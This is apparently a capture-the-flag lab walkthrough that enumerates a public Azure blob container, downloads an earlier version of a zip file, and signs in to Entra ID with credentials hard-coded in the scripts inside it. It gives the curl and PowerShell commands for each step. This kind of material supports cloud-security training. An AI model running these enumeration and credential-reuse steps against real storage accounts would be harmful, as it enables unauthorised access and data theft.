https://pwnedlabs.io/labs/azure-blob-container-to-initial-access

The lab starts with a publicly exposed URL `https://dev.megabigtech.com/$web/index.html`. Navigate here and inspect the web page and we find a references to `https://mbtwebsite.blob.core.windows.net/$web/...`

`mbtwebsite` = name of the Azure Storage Account associated with the website
`blob.core.windows.net` = Azure Blob Storage Service
`$web` = name of the container hosting the web, and it is situated within the storage account

Working in linux but following the lab, we use `pwsh` and and `iwr` enumerate the blob storage :
- Ensure PowerShell and Azure CLI are installed

```PowerShell
Invoke-WebRequest -Uri 'https://mbtwebsite.blob.core.windows.net/$web/index.html' -Method Head
```

Expand the headers using `Select-Object` as they were truncated in the output:

```bash
Invoke-WebRequest -Uri 'https://mbtwebsite.blob.core.windows.net/$web/index.html' -Method Head | Select-Object -ExpandProperty Headers
	x-ms-blob-type: BlockBlob
	Server: Windows-Azure-Blob

# Or on Linux
curl -I https://mbtwebsite.blob.core.windows.net/$web/index.html
```

Explore `$web` more and navigate in a browser to `https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=list`

Return all blobs in a XML document:
`https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=list`

Return just directories in the container, specify a delimiter: 
`https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=list&delimiter=%2F`

List previous blob versions:
`https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=list&include=versions`
- the `versions` parameter is only supported by version `2019-12-12` and later.
- specify version of the operation by setting `x-ms-version` and rerun:
```bash
apt install libxml2-utils
curl -H "x-ms-version: 2019-12-12" 'https://mbtwebsite.blob.core.windows.net/$web?restype=container&comp=list&include=versions' | xmllint --format - | less
	<Name>scripts-transfer.zip</Name>
	<VersionId>2025-08-07T21:08:03.6678148Z</VersionId>
```

We see the blob `scripts-transfer.zip` and the version ID that allows us to download it:

```bash
curl -H "x-ms-version: 2019-12-12" 'https://mbtwebsite.blob.core.windows.net/$web/scripts-transfer.zip?versionId=2025-08-07T21:08:03.6678148Z' --output scripts-transfer.zip
```

Unzipping, we find two scripts. Both contain credentials! Running these scripts we get an error and must install the `MSAL.PS` module first:

```PowerShell
./entra_users.ps1
	Import-Module MSAL.PS Error

Install-Module -Name MSAL.PS

./entra_users.ps1
	To sign in, use a web browser to open the page https://login.microsoft.com/device and enter the code BWNFVTVC7 to authenticate.

# Open Browser > navigate to https://login.microsoft.com/device and enter code > Enter email and password from `entra_users.ps1` > Continue > Return to Terminal for Entra Users output (Azure AD)
```

To get flag, run following commands:

```PowerShell
Install-Module -Name Az
Import-Module -Name Az
Connect-AzAccount
Get-AzADUser -SignedIn | fl
	flag

# OR use linux (linux works)
az login --use-device-code
	To sign in, use a web browser to open the page https://login.microsoft.com/device and enter the code ES6QHV5UX to authenticate.
az ad signed-in-user show
```
